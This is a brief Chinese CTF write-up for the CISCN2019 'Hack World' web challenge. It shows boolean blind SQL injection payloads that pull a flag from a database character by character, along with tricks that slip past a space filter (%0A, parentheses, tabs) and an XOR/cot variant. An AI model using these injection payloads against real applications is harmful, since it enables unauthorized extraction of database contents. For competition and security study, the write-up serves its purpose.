2019-07-24

[CISCN2019 华北赛区 Day2 Web1] Hack World

题目信息：

All You Want Is In Table ‘flag’ and the column is ‘flag’

Now, just give the id of passage

id=1 –> Hello, glzjin wants a girlfriend.

id=-1 –> Error Occured When Fetch Result.

上BP先fuzz一遍，burpsuite下的payload:

-1=(ascii(substr((select%0Aflag%0Afrom%0Aflag),1,1))='102')'

然后在写python脚本的时候用上面的payload死活不行，然后换了一下payload.

-1=(ascii(substr((select(flag)from(flag)),1,1))=102)'

可行。

上脚本//吐槽一下buuctf平台的网络限制，太快是不行滴，悲。

TAB () %0A 代替空格

1^(cot(ascii(mid((select(flag)from(flag)),1,1))=102))^1

其中的cot函数的作用是求余切值,会得到0.6这样,最后通过异或和四舍五入最后为1
